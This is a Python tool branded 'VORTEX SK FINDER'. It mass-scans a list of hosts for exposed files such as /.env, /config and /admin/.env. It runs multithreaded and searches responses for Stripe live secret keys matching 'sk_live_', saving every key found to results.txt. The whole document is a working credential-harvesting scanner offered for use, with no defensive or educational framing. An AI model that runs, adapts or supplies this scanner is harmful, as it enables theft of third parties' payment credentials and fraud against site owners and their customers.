import requests
import re
import time
from termcolor import colored
import pyfiglet
from concurrent.futures import ThreadPoolExecutor

def banner():
    font = pyfiglet.figlet_format("VORTEX SK FINDER", font="slant")
    print(colored(font, 'cyan'))
    print(colored('SK Finder', 'yellow'))
    print("\n")

def loading_animation(text, duration=1):
    animation_chars = ['|', '/', '-', '\\']
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in animation_chars:
            print(f"\r{text} {char}", end='', flush=True)
            time.sleep(0.05)
    print("\r" + " " * (len(text) + 2), end='', flush=True)

def probe_site(protocol_and_url):
    protocol, base_url, path = protocol_and_url
    full_url = protocol + base_url + path
    loading_animation(f"CHECKING {full_url}")
    try:
        response = requests.get(full_url, timeout=5)
        if response.status_code == 200:
            key_pattern = re.compile(r'(sk_live_[\w\d]{24})')
            match = key_pattern.search(response.text)
            if match:
                key = match.group(1)
                result = f"Found key '{key}' at {full_url}"
                return colored(result, 'green')
            else:
                return colored(f"No key found at {full_url}", 'yellow')
        else:
            return colored(f"Error {response.status_code} at {full_url}", 'red')
    except requests.ConnectionError:
        return colored(f"Failed to connect to {full_url}", 'red')

def search_urls(urls, protocols, paths):
    tasks = []
    for base_url in urls:
        for protocol in protocols:
            for path in paths:
                tasks.append((protocol, base_url.strip(), path))

    with open('results.txt', 'w') as outfile, ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(probe_site, tasks)
        for result in results:
            print(result)
            if "Found key" in result:
                outfile.write(result + '\n')

    print(colored("\n[+] Scan complete!", 'magenta'))

if __name__ == '__main__':
    banner()

    with open('ip.txt', 'r') as file:
        urls = file.readlines()

    paths = [
        '/env', '/.env', '/config', '/admin',
        '/secret', '/admin/.env'
    ]

    protocols = ['http://', 'https://']

    search_urls(urls, protocols, paths)